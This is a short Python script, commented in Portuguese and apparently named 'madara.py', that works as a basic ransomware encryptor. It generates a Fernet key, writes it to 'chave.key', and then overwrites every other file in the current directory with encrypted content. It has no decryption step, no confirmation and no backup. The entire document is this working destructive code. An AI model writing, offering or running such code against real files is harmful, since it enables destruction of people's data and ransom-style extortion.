# vai criptografar arquivos de texto
# pip install cryptography

import os

from cryptography.fernet import Fernet

files = []

key = Fernet.generate_key()

with open("chave.key", "wb") as chave:
    chave.write(key)

for file in os.listdir():
    if file == 'madara.py' or file == 'chave.key': #não pega o nosso arquivo e nem a key
        continue
    if os.path.isfile(file):
        files.append(file)

for file in files:
    with open(file, "rb") as arquivo:
        conteudo = arquivo.read()
    conteudo_encrypted = Fernet(key).encrypt(conteudo)
    with open(file, "wb") as arquivo:
        arquivo.write(conteudo_encrypted)